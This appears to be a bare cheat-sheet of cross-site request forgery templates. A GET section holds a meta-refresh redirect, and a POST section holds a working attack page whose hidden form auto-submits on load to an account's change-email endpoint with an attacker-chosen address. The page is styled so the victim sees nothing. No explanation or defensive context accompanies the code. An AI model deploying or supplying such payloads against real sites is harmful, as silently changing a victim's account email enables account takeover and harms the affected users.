
## GET CSRF

```html

<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="refresh" content="0; URL=https://example.com/">
</head>
<body>
 <p> hello </p>
</body>
</html>

```

## POST CSRF

```html

<!DOCTYPE html>
<html>
<head>
    <title></title>
    <style>
        /* Ensure absolutely nothing is visible on the page */
        body {
            margin: 0;
            padding: 0;
            background: white;
            display: block;
        }
        /* Hide any potential fallback content */
        form {
            display: none;
        }
    </style>
</head>
<body>
	 <!-- CHANGE URL here -->
    <form id="autoSubmitForm" 
          style="display: none;" 
          method="POST"
          action="https://[CHANGE_ME]/my-account/change-email"
          enctype="application/x-www-form-urlencoded">
        <input type="hidden" name="email" value="toto123@ok.com">
    </form>

    <script>
        // submit the hidden form
        document.getElementById('autoSubmitForm').submit();
    </script>
</body>
</html>

```